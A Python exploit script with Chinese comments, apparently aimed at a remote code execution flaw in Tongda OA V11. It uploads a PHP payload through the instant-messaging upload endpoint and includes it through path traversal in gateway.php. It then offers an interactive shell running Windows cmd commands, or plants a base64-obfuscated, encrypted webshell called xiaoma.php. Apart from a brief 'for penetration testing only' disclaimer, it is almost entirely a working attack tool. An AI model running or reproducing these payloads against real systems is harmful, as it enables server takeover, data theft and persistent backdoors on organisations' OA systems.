#!/usr/bin/python
#coding:utf-8

import argparse
from colorama import *
import requests

"""
					本exp仅用以渗透测试通达OA的RCE代码执行漏洞
					切勿做违法乱纪的事情，代码贴合通达V11版本
					部分版本可能因路径问题无法正常运行，代码处
					会进行标注，可以修改路径解决，望注意！
					
"""

init(autoreset=True)
headers = {
		"Content-Type":"application/x-www-form-urlencoded"
	}
def doc():
	"""@author 风起 QQ:1402720815"""
	"""要是妹子发现这条注释就加我啊╰(●’◡’●)╮"""
	pass

def banner():
	print("\033[0;32;40m\t\t\t\tTongda RCE EXP\033[0m")
	print("  __                            .___                               ")
	print("_/  |_  ____   ____    ____   __| _/____      ____ ___  _________  ")
	print("\   __\/  _ \ /    \  / ___\ / __ |\__  \   _/ __ \\  \/  /\____ \ ")
	print(" |  | (  <_> )   |  \/ /_/  > /_/ | / __ \_ \  ___/ >    < |  |_> >"+"\033[0;36;40m\t大风起兮云飞扬\033[0m")
	print(" |__|  \____/|___|  /\___  /\____ |(____  /  \___  >__/\_ \|   __/ ")
	print("                  \//_____/      \/     \/       \/      \/|__|    ")
	print("\033[0;33;40m\t\t\t\t我只是一个EXP\033[0m")
	print("\n")

	print("用法:")
	print("	--help:帮助文档")
	print("	-H:目标域名 (-H http://127.0.0.1)")
	print("	-file-shell:生成木马 (-file-shell)")

def test(cmd,host):
	try:
		pdata={"UPLOAD_MODE":1,"P":1,"DEST_UID":1}
		files = {"ATTACHMENT": cmd}
		r = requests.post(host+"/ispirit/im/upload.php",data=pdata,files=files)	#路径修改处
		path = r.text
		path = path[path.find('@')+1:path.rfind('|')].replace("_","/").replace("|",".")
		return path
	except(Exception) as e:
		print(e)
		pass

def exploit(host):
	
		cmd= """
<?php
	$command=$_POST['cmd'];
	$wsh = new COM('WScript.shell');
	$exec = $wsh->exec("cmd /c ".$command);
	$stdout = $exec->StdOut();
	$stroutput = $stdout->ReadAll();
	echo $stroutput;
?>
		"""
		path=test(cmd,host)
		if path is not None:
			while(True):
				cmd=input('root@zxy:~# ')
				if cmd == "exit":
					break
				jsons='json={"url":"/general/../../attach/im/'+path+'"}&cmd=%s' %cmd
				include = requests.post(host+"/ispirit/interface/gateway.php",data=jsons,headers=headers)
				print(include.text)
	

def file(host):
	try:
		cmd= """
<?php
$fp = fopen("xiaoma.php", 'w');
$a = base64_decode("PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9HRVRbJ3Bhc3MnXSkpCnsKICAgICRrZXk9c3Vic3RyKG1kNSh1bmlxaWQocmFuZCgpKSksMTYpOwogICAgJF9TRVNTSU9OWydrJ109JGtleTsKICAgIHByaW50ICRrZXk7Cn0KZWxzZQp7CiAgICAka2V5PSRfU0VTU0lPTlsnayddOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJHApIHtldmFsKCRwLiIiKTt9fQoJQG5ldyBDKCRwYXJhbXMpOwp9Cj8+");
fwrite($fp, $a);
fclose($fp);
?>		
		"""
		path=test(cmd,host)
		jsons='json={"url":"/general/../../attach/im/'+path+'"}'
		include = requests.post(host+"/ispirit/interface/gateway.php",data=jsons,headers=headers)
		filepath=host+"/ispirit/interface/xiaoma.php"
		print("Trojan path:"+filepath)
		print("The password for the pass")
		
	except:
		pass
def main():
	try:
		banner()
		parser = argparse.ArgumentParser()
		parser.add_argument("-H","--host", help="目标域名")
		parser.add_argument("-file-shell","--file",action='store_true',help="生成一句话木马")
		print("\n")
		args = parser.parse_args()
		if(args.host==None):
			print("\033[41m域名不能为空!")
			exit(0)
		host=args.host
		HttpError=args.host.find("http://")
		if HttpError is -1:
			print("\033[41m默认使用http协议如需指定https协议请在url前手动指定。")
			host="http://"+args.host
		if args.file:
			file(host)
			exit(0)
		exploit(host)
	except(Exception) as e:
		print(e)
		print("\033[41m请检查语法是否存在错误!")
		pass	

if __name__=="__main__":
	main()
